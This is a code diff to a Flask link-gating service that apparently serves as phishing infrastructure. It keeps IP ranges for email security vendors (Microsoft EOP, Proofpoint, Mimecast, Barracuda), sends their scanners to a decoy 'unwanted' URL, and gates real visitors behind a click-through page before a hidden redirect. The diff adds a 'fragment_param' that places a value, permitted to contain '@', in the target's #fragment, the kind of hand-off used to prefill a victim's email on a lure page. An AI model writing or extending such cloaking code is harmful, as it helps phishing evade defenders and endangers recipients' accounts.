@@ -4,7 +4,7 @@ import json
 import secrets
 import logging
 from ipaddress import ip_address, ip_network
-from urllib.parse import urlsplit, urlunsplit, urlencode, parse_qsl
+from urllib.parse import urlsplit, urlunsplit, urlencode, parse_qsl, quote
 
 import httpx
 from flask import (
@@ -49,15 +49,11 @@ EOP = [
     ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20"),
 ]
 PROOFPOINT = [
-    ip_network("148.163.0.0/16"),
-    ip_network("67.231.144.0/20"),
-    ip_network("185.132.40.0/22"),
-    ip_network("185.132.44.0/22"),
-    ip_network("194.154.77.0/24"),
-    ip_network("195.245.230.0/23"),
+    ip_network("148.163.0.0/16"), ip_network("67.231.144.0/20"),
+    ip_network("185.132.40.0/22"), ip_network("185.132.44.0/22"),
+    ip_network("194.154.77.0/24"), ip_network("195.245.230.0/23"),
     ip_network("62.128.218.0/23"),
-    ip_network("217.146.94.0/23"),
-    ip_network("217.146.96.0/20"),
+    ip_network("217.146.94.0/23"), ip_network("217.146.96.0/20"),
 ]
 MIMECAST = [ip_network("207.211.30.0/23"), ip_network("91.220.42.0/24")]
 BARRACUDA = [ip_network("64.235.144.0/20"), ip_network("209.240.128.0/19")]
@@ -286,8 +282,14 @@ async def landing(token: str):
         await emit_log({"event": "landing_scanner_redirect", **tag, "token": token[:12], "to": unwanted})
         return redirect(unwanted, code=302)
 
+    # forward allowed query params
     allowed = set(data.get("params", []))
     forwarded = {k: v for k, v in request.args.items() if k in allowed and v}
+
+    # fragment_param carries a value that becomes the #fragment on the target
+    fp = data.get("fragment_param", "")
+    if fp and request.args.get(fp):
+        forwarded[fp] = request.args.get(fp)
 
     nonce_payload = {"t": token, "n": secrets.token_urlsafe(16), "ts": time.time()}
     nonce_blob = cookie_serializer.dumps(nonce_payload)
@@ -369,14 +371,25 @@ async def execute(token: str):
     except BadSignature:
         return _static_page("Invalid link", "This link is not valid.", 404)
 
-    allowed = set(data.get("params", []))
-    forwarded = {k: request.form.get(k, "") for k in allowed if request.form.get(k)}
-
     target = data["target"]
-    if forwarded:
-        target = _append_query(target, forwarded)
 
-    await emit_log({"event": "post_ok", **tag, "token": token[:12], "forwarded": forwarded})
+    # query-string params (previous behavior)
+    allowed_q = set(data.get("params", []))
+    q_forward = {k: request.form.get(k, "") for k in allowed_q if request.form.get(k)}
+    if q_forward:
+        target = _append_query(target, q_forward)
+
+    # fragment param — appended after '#'
+    fp = data.get("fragment_param", "")
+    fv = ""
+    if fp:
+        fv = request.form.get(fp, "")
+        if fv:
+            base = target.split("#", 1)[0]
+            target = f"{base}#{quote(fv, safe='@.-_')}"
+
+    await emit_log({"event": "post_ok", **tag, "token": token[:12],
+                    "q": q_forward, "fragment": fv})
 
     resp = make_response(redirect(target, code=303))
     resp.delete_cookie("gate_session", path="/")
@@ -403,10 +416,22 @@ def mint():
     if unwanted_target and not _valid_http_url(unwanted_target):
         return jsonify({"error": "unwanted_target must be an http(s) URL"}), 400
 
+    # query-string params (optional, list of names)
     allowed_params = body.get("params") or []
     if not isinstance(allowed_params, list) or not all(isinstance(p, str) for p in allowed_params):
         return jsonify({"error": "params must be a list of strings"}), 400
-    allowed_params = [p for p in allowed_params if p.isidentifier()]
+    allowed_params = [
+        p for p in allowed_params
+        if 1 <= len(p) <= 64 and all(c.isalnum() or c in "-_.:@" for c in p)
+    ]
+
+    # fragment param — single name whose value becomes the '#fragment' on the target
+    fragment_param = body.get("fragment_param", "") or ""
+    if fragment_param:
+        if not isinstance(fragment_param, str) or not (1 <= len(fragment_param) <= 64):
+            return jsonify({"error": "fragment_param must be a short string"}), 400
+        if not all(c.isalnum() or c in "-_.:@" for c in fragment_param):
+            return jsonify({"error": "fragment_param has invalid characters"}), 400
 
     tok = serializer.dumps({
         "target": target,
@@ -415,6 +440,7 @@ def mint():
         "body": body.get("body", "Click the button below to continue."),
         "cta": body.get("cta", "Click here to confirm"),
         "params": allowed_params,
+        "fragment_param": fragment_param,
     })
     base = request.host_url.rstrip("/")
     return jsonify({
@@ -422,6 +448,7 @@ def mint():
         "token": tok,
         "mode": "broadcast",
         "params": allowed_params,
+        "fragment_param": fragment_param,
         "unwanted_target": unwanted_target or UNWANTED_REDIRECT_URL,
     })
 
